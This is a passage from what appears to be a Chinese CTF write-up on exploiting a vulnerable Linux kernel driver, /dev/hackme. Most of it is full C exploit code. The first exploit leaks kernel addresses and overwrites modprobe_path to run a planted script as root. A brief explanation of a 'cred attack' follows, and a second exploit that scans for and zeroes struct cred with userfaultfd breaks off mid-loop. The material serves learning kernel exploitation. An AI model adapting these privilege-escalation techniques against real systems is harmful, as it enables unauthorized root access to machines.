0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> modprobe_path = <span class="number">0xffffffff8483f960</span> - <span class="number">0xffffffff84000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> tmp[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_addr</span><span class="params">(<span class="keyword">size_t</span> kernel_base)</span> </span>&#123;</span><br><span class="line">   modprobe_path += kernel_base;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path=0x%lx\n&quot;</span>,modprobe_path);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root wrong&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">   initFD();</span><br><span class="line">   kcreate(<span class="number">0</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kcreate(<span class="number">1</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kfree(<span class="number">0</span>);</span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">4</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">5</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">6</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">7</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">8</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">2</span>);</span><br><span class="line">   kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;heap_addr=0x%lx\n&quot;</span>,heap_addr);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">   kread(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line">   <span class="keyword">size_t</span> kernel_base = ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] - <span class="number">0x625D80</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;kernel_base=0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">   init_addr(kernel_base);</span><br><span class="line">   *((<span class="keyword">size_t</span> *)buf) = modprobe_path;</span><br><span class="line">   *((<span class="keyword">size_t</span> *)(buf+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">   kwrite(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">10</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>(tmp,<span class="string">&quot;/tmp/shell.sh&quot;</span>);</span><br><span class="line">   kwrite(<span class="number">4</span>,tmp,<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">3</span>);</span><br><span class="line">   kfree(<span class="number">4</span>);</span><br><span class="line">   kfree(<span class="number">5</span>);</span><br><span class="line">   kfree(<span class="number">6</span>);</span><br><span class="line">   kfree(<span class="number">7</span>);</span><br><span class="line">   kfree(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">   system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;chmod +x /tmp/shell.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">   system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">   sleep(<span class="number">10</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路 - Cred Attack</strong></p>
<p><code>cred attack</code> 的思路特别简单，扫描到 <code>cred</code> 然后将其修改</p>
<p>扫描的过程中，通常有两种定位方法：</p>
<ul>
<li>在 <code>task_struct</code> 中，通过 <code>*real_cred</code> 和 <code>*cred</code> 下方的字符串间接定位到 <code>*cred</code>，然后利用该指针获取 <code>cred</code> 的地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"><span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>cred</code> 中，通过以下8个字段都等于 UID 来直接定位 <code>cred</code>（UID 通常为 1000）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br></pre></td></tr></table></figure>
<p>定位到 <code>cred</code> 以后，就可以把 [uid] - [fsgid] 这8个字段全部置空，然后把置空后的数据返回给内核</p>
<p>在这个过程中，唯一的问题就是需要的空间太大，在用户态必须用 mmap 进行分配，而 <code>copy_from_user</code> 在检测到 mmap 分配空间后就会报错</p>
<p>其实 <code>Double Fetch</code> 中的 <code>userfaultfd</code> 机制早就解决了这个问题，因为我们不需要使用它进行条件竞争，于是我们在 <code>handler</code> 里进行 <code>sleep</code> 就好</p>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATA_OFFSET 0x160000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEARCH_SIZE 0x10000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_userfaultfd 323</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page;</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page_len;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(msg);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">while_getroot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;get root&quot;</span>);</span><br><span class="line">            execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] leak_handler created&quot;</span>);</span><br><span class="line">   sleep(<span class="number">0x100</span>); </span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   struct pollfd pollfd;</span></span><br><span class="line"><span class="comment">   int nready;</span></span><br><span class="line"><span class="comment">   pollfd.fd = uffd;</span></span><br><span class="line"><span class="comment">   pollfd.events = POLLIN;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   nready = poll(&amp;pollfd, 1, -1);</span></span><br><span class="line"><span class="comment">   if (nready != 1)</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-] Wrong pool return value&quot;);</span></span><br><span class="line"><span class="comment">   nready = read(uffd, &amp;msg, sizeof(msg));</span></span><br><span class="line"><span class="comment">   if (nready &lt;= 0) &#123;</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-]msg error!!&quot;);</span></span><br><span class="line"><span class="comment">   &#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">   char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line"><span class="comment">   if (page == MAP_FAILED)</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-]mmap page error!!&quot;);</span></span><br><span class="line"><span class="comment">   struct uffdio_copy uc;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   memset(page, 0, sizeof(page));</span></span><br><span class="line"><span class="comment">// memcpy(page,&amp;modprobe_path,8);</span></span><br><span class="line"><span class="comment">   uc.src = (unsigned long)page;</span></span><br><span class="line"><span class="comment">   uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);;</span></span><br><span class="line"><span class="comment">   uc.len = PAGE_SIZE;</span></span><br><span class="line"><span class="comment">   uc.mode = 0;</span></span><br><span class="line"><span class="comment">   uc.copy = 0;</span></span><br><span class="line"><span class="comment">   ioctl(uffd, UFFDIO_COPY, &amp;uc);</span></span><br><span class="line"><span class="comment">   puts(&quot;[+] leak_handler done!!&quot;);</span></span><br><span class="line"><span class="comment">   return NULL;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = fault_page_len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">uint64_t</span> size, offset, cred_offset=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> idx, cred_count;</span><br><span class="line">    <span class="keyword">uint32_t</span> * uint_ptr;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    initFD();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">            while_getroot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *read_ptr = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, DATA_OFFSET, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(read_ptr == MAP_FAILED)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;mmap mem error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    kcreate(<span class="number">0</span>,data,<span class="number">0x100</span>);</span><br><span class="line">    kread(<span class="number">0</span>,read_ptr,DATA_OFFSET,-DATA_OFFSET);</span><br><span class="line">    </span><br><span class="line">    uint_ptr = (<span class="keyword">uint32_t</span> *) read_ptr;</span><br><span class="line">    cred_count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] trying to find struct cred....\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SEARCH_SIZE/<span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uint_ptr[i] == UID &amp;&amp; uint_ptr[i+<span class="number">1</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">2</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">3</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">4</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">5</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">6</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">7</span>] == UID)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find cred at offset: 0x%x\n&quot;</span>, i*<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; 